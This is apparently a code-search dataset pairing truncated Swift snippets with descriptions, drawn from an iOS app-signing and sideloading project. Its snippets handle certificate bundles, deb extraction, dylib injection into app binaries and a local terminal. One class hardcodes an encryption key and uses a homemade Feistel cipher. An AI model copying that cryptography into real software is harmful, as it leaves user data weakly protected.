id,language,folder,code_type,file_path,nl,code
181,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Helper to write a length-prefixed chunk","func writeChunk(_ chunkData: Data, to data: inout Data) {
let length = UInt32(chunkData.count).bigEndian
let lengthBytes = withUnsafeBytes(of: length) { Data($0) }"
182,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Helper to write an encrypted chunk","func writeEncryptedChunk(_ chunkData: Data, to data: inout Data) {
// Store original length
let originalLength = UInt32(chunkData.count).bigEndian
let originalLengthBytes = withUnsafeBytes(of: originalLength) { Data($0) }"
183,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Checks if a file URL points to a .backdoor file / - Parameter url: The file URL to check / - Returns: True if the file is likely a backdoor file","static func isBackdoorFile(at url: URL) -> Bool {
// First check extension
if url.pathExtension.lowercased() == ""backdoor"" {"
184,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper method to check if data is in the backdoor file format / - Parameter data: The data to check / - Returns: True if the data appears to be in backdoor format","static func isBackdoorFormat(data: Data) -> Bool {
// Check for encrypted format
if data.count > 1 && data[0] == ENCRYPTED_FORMAT_VERSION {"
185,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper to read a length-prefixed chunk (used by multiple methods)","static func readChunk(from data: Data, offset: inout Int) throws -> Data {
guard offset + 4 <= data.count else {"
186,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Errors that can occur during decoding or verification of backdoor files","enum DecodingError: Error {
case invalidFormat(String)
case invalidCertificate(String)
case unsupportedAlgorithm(String)
case signatureVerificationFailed(String)
case decryptionFailed(String)
}

// Add utility extensions for BackdoorFile
extension BackdoorFile {"
187,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Add utility extensions for BackdoorFile","extension BackdoorFile {
/// Extract and return certificate name for display
var certificateName: String {"
188,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper to save the mobileprovision file","func saveMobileProvision(to url: URL) throws {
try mobileProvisionData.write(to: url)
}

/// Helper to save the p12 file
func saveP12(to url: URL) throws {"
189,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","/ Helper to save the p12 file","func saveP12(to url: URL) throws {
try p12Data.write(to: url)
}

/// Save this backdoor file to disk with .backdoor extension
/// - Parameters:
///   - url: Base URL (without extension)
///   - encrypt: Whether to use the encrypted format (default: true)
/// - Returns: URL to the saved file
@discardableResult"
190,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/BackdoorFileHandler.swift","Function saveBackdoorFile - implements savebackdoorfile functionality","func saveBackdoorFile(to baseURL: URL, encrypt: Bool = true) throws -> URL {
// Ensure the URL has the .backdoor extension
let fileURL: URL
if baseURL.pathExtension.lowercased() != ""backdoor"" {"
191,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","struct ARFile - implements functionality related to a r file","public struct ARFile {
var name: String
var modificationDate: Date
var ownerId: Int
var groupId: Int
var mode: Int
var size: Int
var content: Data
}
"
192,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","Function removePadding - implements removepadding functionality","func removePadding(_ paddedString: String) -> String {
let data = paddedString.data(using: .utf8)!

guard let firstNonSpaceIndex = data.firstIndex(of: UInt8(ascii: "" "")) else {"
193,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","enum ARError - implements functionality related to a r error","enum ARError: Error {
case badArchive(String)
}

func getFileInfo(_ data: Data, _ offset: Int) throws -> ARFile {"
194,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","Function getFileInfo - retrieves fileinfo","func getFileInfo(_ data: Data, _ offset: Int) throws -> ARFile {
let sizeRange = offset + 48 ..< offset + 48 + 10
let sizeString = String(data: data.subdata(in: sizeRange), encoding: .ascii) ?? ""0""
let size = Int(removePadding(sizeString))!
if size < 1 {"
195,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/AR.swift","Function extractAR - implements extractar functionality","public func extractAR(_ rawData: Data) throws -> [ARFile] {
// Explicitly type magicBytes as [UInt8] to match the headerBytes type
let magicBytes: [UInt8] = [0x21, 0x3C, 0x61, 0x72, 0x63, 0x68, 0x3E, 0x0A]
let headerData = rawData.subdata(in: 0 ..< 8)
// Create a more explicit [UInt8] array conversion for unambiguous type checking
let headerBytes = [UInt8](headerData)
if headerBytes != magicBytes {"
196,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function processFile - implements processfile functionality","func processFile(at packagesFile: inout URL) throws {
let succeededExtension = packagesFile.pathExtension.lowercased()
let fileManager = FileManager.default

func readData(from url: URL) throws -> Data {"
197,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function readData - implements readdata functionality","func readData(from url: URL) throws -> Data {
return try Data(contentsOf: url)
}

func writeData(_ data: Data, to url: URL) throws {"
198,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function writeData - implements writedata functionality","func writeData(_ data: Data, to url: URL) throws {
try data.write(to: url)
}

func handleCompressedFile(extension _: String, decompressor: (Data) throws -> Data) throws {"
199,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","extension _ - implements _ functionality","func handleCompressedFile(extension _: String, decompressor: (Data) throws -> Data) throws {
let compressedData = try readData(from: packagesFile)
let decompressedData = try decompressor(compressedData)
let outputURL = packagesFile.deletingPathExtension()
try writeData(decompressedData, to: outputURL)
packagesFile = outputURL
}

func handleTarFile() throws {"
200,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift","Function handleTarFile - implements handletarfile functionality","func handleTarFile() throws {
let tarData = try readData(from: packagesFile)
let tarContainer = try TarContainer.open(container: tarData)

let extractionDirectory = packagesFile.deletingLastPathComponent().appendingPathComponent(UUID().uuidString)
try fileManager.createDirectory(at: extractionDirectory, withIntermediateDirectories: true, attributes: nil)

for entry in tarContainer {"
201,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Provides custom encryption and decryption capabilities for .backdoor files / This implementation matches the Python reference implementation for compatibility","class BackdoorEncryption {
// Hardcoded secret key for encryption and decryption
private static let SECRET = ""bdg_was_here_2025_backdoor_245"".data(using: .utf8)!

// Derive key using SHA256
private static var KEY: Data {"
202,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Pads data to align with block size / - Parameters: /   - data: The data to pad /   - blockSize: Block size (default: 16 bytes) / - Returns: Padded data","static func pad(_ data: Data, blockSize: Int = 16) -> Data {
if data.count % blockSize == 0 {"
203,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Custom permutation for obfuscation (byte reversal) / - Parameter block: Block to permute / - Returns: Permuted block","static func permute(_ block: Data) -> Data {
return Data(block.reversed())
}

/// Transformation function for Feistel network
/// - Parameters:
///   - data: Input data
///   - roundKey: Round key
/// - Returns: Transformed data
static func F(_ data: Data, roundKey: Data) -> Data {"
204,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Transformation function for Feistel network / - Parameters: /   - data: Input data /   - roundKey: Round key / - Returns: Transformed data","static func F(_ data: Data, roundKey: Data) -> Data {
var combined = data
combined.append(roundKey)

let hash = SHA256.hash(data: combined)
return hash.withUnsafeBytes { bytes in"
205,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Encrypts a single 16-byte block using a Feistel network / - Parameters: /   - block: 16-byte block to encrypt /   - key: Encryption key / - Returns: Encrypted block","static func encryptBlock(_ block: Data, key: Data) -> Data {
var L = block.prefix(8)
var R = block.suffix(8)

for round in 0 ..< 4 {"
206,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Decrypts a single 16-byte block using a Feistel network / - Parameters: /   - block: 16-byte block to decrypt /   - key: Decryption key / - Returns: Decrypted block","static func decryptBlock(_ block: Data, key: Data) -> Data {
var R = block.prefix(8)
var L = block.suffix(8)

for round in (0 ..< 4).reversed() {"
207,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Encrypts data using custom block cipher / - Parameters: /   - data: Data to encrypt /   - key: Optional custom key (uses default if nil) / - Returns: Encrypted data","static func encryptData(_ data: Data, key: Data? = nil) -> Data {
let encryptionKey = key ?? KEY
let paddedData = pad(data)

// Split into 16-byte blocks
var encryptedData = Data()

for i in stride(from: 0, to: paddedData.count, by: 16) {"
208,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift","/ Decrypts data using custom block cipher / - Parameters: /   - encryptedData: Data to decrypt /   - key: Optional custom key (uses default if nil) /   - originalLength: Length of the original data before padding / - Returns: Decrypted data","static func decryptData(_ encryptedData: Data, key: Data? = nil, originalLength: Int) -> Data {
let decryptionKey = key ?? KEY
var decryptedData = Data()

// Process each 16-byte block
for i in stride(from: 0, to: encryptedData.count, by: 16) {"
209,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function zsign - implements zsign functionality","func zsign(_ appPath: String,
_ provisionPath: String,
_ p12Path: String,
_ password: String,
_ bundleId: String,
_ name: String,
_ version: String,
_ removeProvisioningFile: Bool) -> Int32

// MARK: - External C++ functions

@_silgen_name(""InjectDyLib"")
private func _InjectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool

@_silgen_name(""ChangeDylibPath"")
private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool

@_silgen_name(""ListDylibs"")
private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
210,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _InjectDyLib - implements  injectdylib functionality","private func _InjectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool

@_silgen_name(""ChangeDylibPath"")
private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool

@_silgen_name(""ListDylibs"")
private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
211,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _ChangeDylibPath - implements  changedylibpath functionality","private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool

@_silgen_name(""ListDylibs"")
private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
212,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _ListDylibs - implements  listdylibs functionality","private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool

@_silgen_name(""UninstallDylibs"")
private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
213,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function _UninstallDylibs - implements  uninstalldylibs functionality","private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool

// MARK: - Swift wrapper functions

func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {"
214,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","MARK: - Swift wrapper functions","func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {
return _InjectDyLib(filePath, dylibPath, weakInject, bCreate)
}

func changeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool {"
215,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function changeDylibPath - implements changedylibpath functionality","func changeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool {
return _ChangeDylibPath(filePath, oldPath, newPath)
}

func getDylibsList(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool {"
216,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function getDylibsList - retrieves dylibslist","func getDylibsList(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool {
return _ListDylibs(filePath, dylibPaths)
}

func removeDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool {"
217,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function removeDylibs - implements removedylibs functionality","func removeDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool {
return _UninstallDylibs(filePath, dylibPaths)
}

// MARK: - App Signing Functions

func signInitialApp(
bundle: BundleOptions,
mainOptions: SigningMainDataWrapper,
signingOptions: SigningDataWrapper,"
218,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","MARK: - App Signing Functions","func signInitialApp(
bundle: BundleOptions,
mainOptions: SigningMainDataWrapper,
signingOptions: SigningDataWrapper,
appPath: URL,
completion: @escaping (Result<(URL, NSManagedObject), Error>) -> Void
) {"
219,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function resignApp - implements resignapp functionality","func resignApp(certificate: Certificate, appPath: URL, completion: @escaping (Bool) -> Void) {
UIApplication.shared.isIdleTimerDisabled = true

DispatchQueue(label: ""Resigning"").async {"
220,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","MARK: - Helper Functions","private func signAppWithZSign(
tmpDirApp: URL,
certPaths: (provisionPath: String, p12Path: String),
password: String,
main: SigningMainDataWrapper? = nil,
options: SigningDataWrapper? = nil
) throws {"
221,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function injectDylib - implements injectdylib functionality","func injectDylib(filePath: String, dylibPath: String, weakInject: Bool) -> Bool {
// Call injectDyLib function using the Swift wrapper
let bCreate = false
return injectDyLib(filePath, dylibPath, weakInject, bCreate)
}

func changeDylib(filePath: String, oldPath: String, newPath: String) -> Bool {"
222,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function changeDylib - implements changedylib functionality","func changeDylib(filePath: String, oldPath: String, newPath: String) -> Bool {
// Call changeDylibPath function using the Swift wrapper
return changeDylibPath(filePath, oldPath, newPath)
}

func updateMobileProvision(app: URL) throws {"
223,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updateMobileProvision - updates mobileprovision","func updateMobileProvision(app: URL) throws {
let provisioningFilePath = app.appendingPathComponent(""embedded.mobileprovision"")
if FileManager.default.fileExists(atPath: provisioningFilePath.path) {"
224,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function listDylibs - implements listdylibs functionality","func listDylibs(filePath: String) -> [String]? {
// Call listDylibs function using the Swift wrapper
let dylibPathsArray = NSMutableArray()

let success = getDylibsList(filePath, dylibPathsArray)

if success {"
225,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function uninstallDylibs - implements uninstalldylibs functionality","func uninstallDylibs(filePath: String, dylibPaths: [String]) -> Bool {
// Call removeDylibs function using the Swift wrapper
return removeDylibs(filePath, dylibPaths)
}

func updatePlugIns(options: SigningDataWrapper, app: URL) throws {"
226,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updatePlugIns - updates plugins","func updatePlugIns(options: SigningDataWrapper, app: URL) throws {
if options.signingOptions.removePlugins {"
227,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function removeWatchPlaceholderExtension - implements removewatchplaceholderextension functionality","func removeWatchPlaceholderExtension(options: SigningDataWrapper, app: URL) throws {
if options.signingOptions.removeWatchPlaceHolder {"
228,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updateInfoPlist - updates infoplist","func updateInfoPlist(
infoDict: NSMutableDictionary,
main: SigningMainDataWrapper,
options: SigningDataWrapper,
icon _: UIImage?,
app: URL
) throws {"
229,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift","Function updateLocalizedInfoPlist - updates localizedinfoplist","func updateLocalizedInfoPlist(in appDirectory: URL, newDisplayName: String) {
let fileManager = FileManager.default
do {"
230,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","class TweakHandler - implements functionality related to tweak handler","class TweakHandler {
let fileManager = FileManager.default

private var urls: [String]
private let app: URL
private var urlsToInject: [URL] = []
private var directoriesToCheck: [URL] = []

init(urls: [String], app: URL) {"
231,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function getInputFiles - retrieves inputfiles","func getInputFiles() throws {
guard !urls.isEmpty else {"
232,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","finally, handle extracted contents","private func handleExtractedDirectoryContents(at urls: [URL]) throws {
for url in urls {"
233,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Inject imported dylib file","private func handleDylib(at url: URL) throws {
do {"
234,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Inject imported framework dir","private func handleDylib(framework: URL) throws {
do {"
235,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Extract imported deb file","private func handleDeb(at url: URL, baseTmpDir: URL) throws {
let uniqueSubDir = baseTmpDir.appendingPathComponent(UUID().uuidString)
try Self.createDirectoryIfNeeded(at: uniqueSubDir)

// I don't particularly like this code
// but it somehow works well enough,
// do note large lzma's are slow as hell
do {"
236,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Read extracted deb file, locate all necessary contents to copy over to the .app","private func handleDirectories(at urls: [URL]) throws {
let directoriesToCheck = [
""Library/Frameworks/"",
""var/jb/Library/Frameworks/"",
""Library/MobileSubstrate/DynamicLibraries/"",
""var/jb/Library/MobileSubstrate/DynamicLibraries/"",
""Library/Application Support/"",
""var/jb/Library/Application Support/"",
]
"
237,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","MARK: - Find correct files in debs","extension TweakHandler {
private func searchForBundles(in directory: URL) throws {"
238,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function searchForBundles - implements searchforbundles functionality","private func searchForBundles(in directory: URL) throws {
let fileManager = FileManager.default
let allFiles = try fileManager.contentsOfDirectory(
at: directory,
includingPropertiesForKeys: nil,
options: [.skipsHiddenFiles]
)

let bundleDirectories = allFiles.filter { url in"
239,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function locateDylibFiles - implements locatedylibfiles functionality","private func locateDylibFiles(in directory: URL) throws -> [URL] {
let fileManager = FileManager.default
let files = try fileManager.contentsOfDirectory(at: directory, includingPropertiesForKeys: nil, options: [])

return files.filter { url in"
240,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function locateFrameworkDirectories - implements locateframeworkdirectories functionality","private func locateFrameworkDirectories(in directory: URL) throws -> [URL] {
let fileManager = FileManager.default
let files = try fileManager.contentsOfDirectory(
at: directory,
includingPropertiesForKeys: nil,
options: [.skipsHiddenFiles]
)

return files.filter { url in"
241,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","MARK: - File management","extension TweakHandler {
private static func createDirectoryIfNeeded(at url: URL) throws {"
242,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function createDirectoryIfNeeded - creates directoryifneeded","private static func createDirectoryIfNeeded(at url: URL) throws {
let fileManager = FileManager.default
if !fileManager.fileExists(atPath: url.path) {"
243,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function findExecutable - implements findexecutable functionality","public static func findExecutable(at frameworkURL: URL) throws -> URL? {
let infoPlistURL = frameworkURL.appendingPathComponent(""Info.plist"")

let plistData = try Data(contentsOf: infoPlistURL)
if let plist = try PropertyListSerialization
.propertyList(from: plistData, options: [], format: nil) as? [String: Any],
let executableName = plist[""CFBundleExecutable""] as? String
{"
244,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift","Function moveFile - implements movefile functionality","private static func moveFile(from sourceURL: URL, to destinationURL: URL) throws {
let fileManager = FileManager.default
if fileManager.fileExists(atPath: destinationURL.path) {"
245,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift","class EsignDecryptor - implements functionality related to esign decryptor","class EsignDecryptor {
private let input: String

init(input: String) {"
246,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift","Function extractBase64 - implements extractbase64 functionality","func extractBase64() -> Data? {
let pattern = #""source\[(.*?)\]""#

if let regex = try? NSRegularExpression(pattern: pattern),
let match = regex.firstMatch(in: input, range: NSRange(input.startIndex..., in: input)),
let range = Range(match.range(at: 1), in: input)
{"
247,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift","Function decrypt - implements decrypt functionality","func decrypt(key: [UInt8], keyLength: Int) -> [String]? {
guard let data = extractBase64() else {"
248,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ LocalTerminalService - An on-device implementation of terminal functionality / This replaces the previous web-based terminal implementation with a fully local solution","class LocalTerminalService {
static let shared = LocalTerminalService()

// Process handling
private var activeProcesses: [String: Process] = [:]
private var outputPipes: [String: Pipe] = [:]
private var inputPipes: [String: Pipe] = [:]

// Output handlers
private var outputHandlers: [String: (String) -> Void] = [:]"
249,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Session Management / Creates a new terminal session","func createSession(completion: @escaping (Result<String, Error>) -> Void) {
let sessionId = UUID().uuidString

// Set default working directory to Documents
let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
workingDirectories[sessionId] = documentsDirectory

logger.log(message: ""Created new local terminal session: \(sessionId)"", type: .info)
completion(.success(sessionId))
}"
250,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Terminates a terminal session","func terminateSession(_ sessionId: String, completion: @escaping (Result<Void, Error>) -> Void) {
if let process = activeProcesses[sessionId] {"
251,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Command Execution / Executes a command in the specified session","func executeCommand(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
252,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Sends input to a running process","func sendInput(_ input: String, sessionId: String, completion: @escaping (Result<Void, Error>) -> Void) {
guard let inputPipe = inputPipes[sessionId] else {"
253,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Handles special built-in commands","private func handleSpecialCommand(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) -> Bool {"
254,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Updates the working directory after a 'cd' command","private func updateWorkingDirectory(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void
) {"
255,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Custom Language Support / Executes a command in our custom programming language","private func executeCustomLanguageCommand(
_ command: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
256,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Executes Swift code","private func executeSwiftCode(
_ code: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
257,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Executes Python code","private func executePythonCode(
_ code: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
